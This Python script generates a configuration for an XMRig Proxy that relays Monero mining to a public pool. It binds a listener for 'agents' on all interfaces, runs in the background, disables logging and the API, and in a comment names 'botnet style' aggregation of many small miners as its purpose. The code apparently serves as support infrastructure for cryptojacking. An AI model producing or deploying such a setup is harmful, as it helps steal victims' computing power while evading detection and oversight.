import json
import uuid
import sys

def generate_config():
    """
    Generates a secure config.json for the XMRig Proxy.
    This configuration minimizes logging and sets up the listener for agents.
    """

    # Default upstream pool (change this to your actual pool)
    upstream_pool = "pool.supportxmr.com:3333"
    wallet_address = "YOUR_MONERO_WALLET_ADDRESS_HERE"

    config = {
        "background": True,
        "colors": True,
        "custom-diff": 0,
        "donate-level": 0,
        "log-file": None,
        "syslog": False,
        "verbose": False,
        "workers": True,

        "api": {
            "port": 0,
            "access-token": None,
            "worker-id": None
        },

        "http": {
            "enabled": False,
        },

        "bind": [
            {
                "host": "0.0.0.0",
                "port": 3333,
                "tls": False
            }
        ],

        "pools": [
            {
                "url": upstream_pool,
                "user": wallet_address,
                "pass": "x",
                "keepalive": True,
                "nicehash": False,
                "variant": -1,
                "tls": False,
                "tls-fingerprint": None
            }
        ],

        "retries": 5,
        "retry-pause": 5,
        "reuse-timeout": 0,
        "mode": "simple"
    }

    # "simple" mode is best for aggregating many small miners (botnet style)
    # "nicehash" mode is if you are pointing to a Nicehash order

    with open("config.json", "w") as f:
        json.dump(config, f, indent=4)

    print("[+] Generated config.json for XMRig Proxy")
    print(f"    Listener: 0.0.0.0:3333")
    print(f"    Upstream: {upstream_pool}")
    print("    [!] Don't forget to edit the wallet address in the generated file!")

if __name__ == "__main__":
    generate_config()
